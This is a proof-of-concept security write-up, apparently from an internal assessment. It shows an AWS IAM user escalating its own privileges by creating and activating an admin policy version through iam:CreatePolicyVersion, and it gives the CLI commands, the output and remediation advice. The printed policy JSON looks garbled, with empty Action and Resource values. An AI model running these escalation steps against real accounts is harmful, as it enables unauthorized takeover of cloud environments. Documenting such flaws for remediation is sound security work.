# PoC: IAM Self-Escalation via iam:CreatePolicyVersion

## Summary
The `qa-a` IAM user was granted `iam:CreatePolicyVersion` with `Resource: "*"`,
intended to let QA manage test-environment policies. Because the permission
wasn't scoped away from qa-a's own attached policy, qa-a could create a new
version of its own policy granting full administrative access, then set that
version as active — fully self-escalating with zero additional permissions.

## Environment
- User: `qa-a`
- Policy: `qa-testing-P` (customer-managed)
- Original permissions: scoped S3/EC2 read-only + iam:CreatePolicyVersion (Resource: *)

## Attack steps

1. Confirm current identity:

aws sts get-caller-identity --profile qa-a

2. Create a new malicious policy version, granting full access, and set as default:

aws iam create-policy-version --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-testing-P --policy-document "{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"","Resource":""}]}" --set-as-default --profile qa-a


**Result:**
```json
{
    "PolicyVersion": {
        "VersionId": "v2",
        "IsDefaultVersion": true,
        "CreateDate": "2026-09-14T14:15:37+00:00"
    }
}
```

![QA-a self-escalation command output](../poc-ss/Screenshot 2026-09-15 001812.png)

3. Verified independently via admin account:

aws iam get-policy --policy-arn arn:aws:iam::<ACCOUNT_ID>:policy/qa-testing-P --profile admin-k

Confirmed `DefaultVersionId: "v2"` — the escalation is live account-wide.

![Verified via admin account](../poc-ss/Scrreenshot 2026-09-15 001735.png)

## Impact
qa-a, originally scoped to view-only S3/EC2 access, now has unrestricted
administrative control over the AWS account.

## Detection
[CloudTrail event details - pending]

## Remediation
Scope `iam:CreatePolicyVersion`'s Resource to exclude policies attached to
the calling identity, or apply a permissions boundary preventing
self-modification.